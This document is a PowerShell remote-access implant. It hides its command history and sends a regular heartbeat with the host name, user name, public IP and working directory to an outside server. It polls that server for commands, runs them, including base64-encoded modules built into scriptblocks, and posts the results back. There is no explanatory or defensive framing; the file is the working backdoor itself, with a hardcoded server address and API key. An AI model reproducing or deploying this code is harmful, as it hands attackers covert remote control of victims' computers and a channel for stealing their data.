Clear-Host
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Set-Location -Path $env:USERPROFILE

$server_url = "https://vnxor.com/"
$api_key    = "gY8KsXhami4pk6t9ObW2VZLAJzGToeDRqfQInSuU"
$session_id = $env:COMPUTERNAME
$Global:ProgressPreference = 'SilentlyContinue'

$headers = @{ "X-API-Key" = $api_key }

$script:cached_ip    = "N/A"
$script:cached_ip_at = [DateTime]::MinValue

function GetPublicIP {
    if (((Get-Date) - $script:cached_ip_at).TotalMinutes -gt 5) {
        try {
            $script:cached_ip    = Invoke-RestMethod -Uri "ident.me" -TimeoutSec 3
            $script:cached_ip_at = Get-Date
        } catch { }
    }
    return $script:cached_ip
}

function SendHeartbeat {
    $body = @{
        session_id = $session_id
        ip         = (GetPublicIP)
        path       = (Get-Location).Path
        user       = $env:USERNAME
    } | ConvertTo-Json
    try {
        Invoke-RestMethod -Method Post -Uri "$server_url/api.php?action=heartbeat" `
            -Body $body -ContentType "application/json; charset=utf-8" -Headers $headers | Out-Null
    } catch { }
}

function PollCommand {
    try {
        $uri = $server_url + "/api.php?action=poll&session_id=" + $session_id
        return Invoke-RestMethod -Uri $uri -Headers $headers -TimeoutSec 10
    } catch { return $null }
}

function SendResult($command_id, $output) {
    $body = @{
        command_id = $command_id
        session_id = $session_id
        output     = $output
        path       = (Get-Location).Path
    } | ConvertTo-Json
    try {
        Invoke-RestMethod -Method Post -Uri "$server_url/api.php?action=result" `
            -Body $body -ContentType "application/json; charset=utf-8" -Headers $headers | Out-Null
    } catch { }
}

function ProcessCommand($obj) {
    $cmd_id = $obj.id
    $type   = $obj.type
    $cmd    = $obj.cmd

    if ($type -eq 'module') {
        $code   = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmd))
        $output = ''
        try { $output = & ([scriptblock]::Create($code)) | Out-String }
        catch { $output = $_.Exception.Message }
        if ([string]::IsNullOrWhiteSpace($output)) { $output = 'Module executed (no output).' }
        for ($i = 0; $i -lt $output.Length; $i += 4000) {
            SendResult $cmd_id $output.Substring($i, [Math]::Min(4000, $output.Length - $i))
        }
        return
    }

    if ($cmd -eq 'exit') { SendResult $cmd_id "Session ended"; exit }

    $output = ''
    try {
        $f = ($cmd -split ' ', 2)[0]
        if ($f -eq 'cd' -or $f -eq 'Set-Location') { $cmd = $cmd + ' -ErrorAction Stop; ls' }
        $output = & ([scriptblock]::Create($cmd)) | Out-String
    } catch { $output = $_.Exception.Message }

    if ([string]::IsNullOrWhiteSpace($output)) { $output = "Command executed: $cmd" }

    for ($i = 0; $i -lt $output.Length; $i += 4000) {
        SendResult $cmd_id $output.Substring($i, [Math]::Min(4000, $output.Length - $i))
    }
}

function MainLoop {
    $last_hb = [DateTime]::MinValue

    while ($true) {
        if (((Get-Date) - $last_hb).TotalSeconds -gt 30) {
            SendHeartbeat
            $last_hb = Get-Date
        }

        try {
            $obj = PollCommand
            if ($null -ne $obj) {
                ProcessCommand $obj
            } else {
                Start-Sleep -Seconds 2
            }
        } catch {
            Start-Sleep -Seconds 5
        }
    }
}

MainLoop
